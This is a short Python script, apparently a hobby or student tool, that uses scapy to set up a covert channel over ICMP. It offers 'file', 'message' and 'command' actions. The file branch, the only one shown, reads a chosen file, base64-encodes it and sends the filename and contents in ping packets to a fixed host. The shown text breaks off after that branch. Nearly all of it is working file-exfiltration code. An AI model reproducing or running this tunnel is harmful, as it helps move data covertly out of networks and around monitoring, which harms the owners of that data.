from scapy.all import sr1,IP,ICMP
import base64


while True:

	action = input("-----------------------\nWhat should we do (with a lazy sailor) ? \nActions are : file | message | command\n")
	
	if action == "file":
		
	
		fileName = input("Which file should we send ?\n")

		fileToSend = open(fileName,"rb")
		binaryData = fileToSend.read()
		encoded = (base64.b64encode(binaryData)).decode('ascii')


		# Protocole : type d'envoi (file/message)
		p = sr1(IP(dst="192.168.18.1")/ICMP()/"file")
		p = sr1(IP(dst="192.168.18.1")/ICMP()/fileName)
		p = sr1(IP(dst="192.168.18.1")/ICMP()/encoded)

